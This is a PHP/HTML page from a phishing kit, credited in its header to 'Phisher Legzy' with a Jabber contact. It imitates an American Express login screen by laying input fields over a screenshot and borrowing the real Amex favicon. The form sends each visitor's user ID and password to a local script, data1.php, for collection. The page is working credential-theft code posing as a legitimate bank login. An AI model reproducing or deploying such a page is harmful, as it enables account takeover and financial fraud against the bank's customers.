<?php
/*
***********************************
|--		PHISHER LEGZY			--|
***********************************
|    Jabber/XMPP : legzy@xmpp.jp  |
***********************************
*/

require "requires/functions.php";

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<title>American Express Login</title>
<head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<link rel="shortcut icon" href="images/favicon.png"/>
<link rel="shortcut icon" href="https://www.aexp-static.com/nav/ngn/img/logo_bluebox.gif" />
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<style type="text/css">
/*----------Text Styles----------*/
input.text { border: 1px #7F9DB9 solid; color: #333; padding-left: 10px; }
input.focus { border-color: #8EB1EB; border-style: solid;  outline: 0; } 
/*----------Para Styles----------*/

</style>

<body style="visibility:hidden" onload="unhideBody()" bgColor="#FFFFFF">

 

</head>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1366px; height:815px; z-index:0"><img src="images/form.png" alt="" title="" border=0 width=1366 height=815></div>

 <form name="login" id="login" method="post" autocomplete="off" autocapitalize="off" action="data1.php">
<input name="username" type="text" placeholder="User ID" style="position:absolute;height:30px;font-size:14px;width:222px;left:265px;top:267px;z-index:6" class="text" required>
<div style="position:absolute;left:510px;top:267px;;z-index:3">
<input name="password" id="demo-field" type="password" placeholder="Password" style="position:absolute;height:30px;font-size:14px;width:222px;z-index:6" class="text" required></div>
<div id="formimage1" style="position:absolute; left:633px; top:310px; z-index:9"><input type="image" name="formimage1" width="101" height="28" src="images/2.png"></div>
</div></form>

<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</body></html>
<ISONLINE VALUE=TRUE></ISONLINE>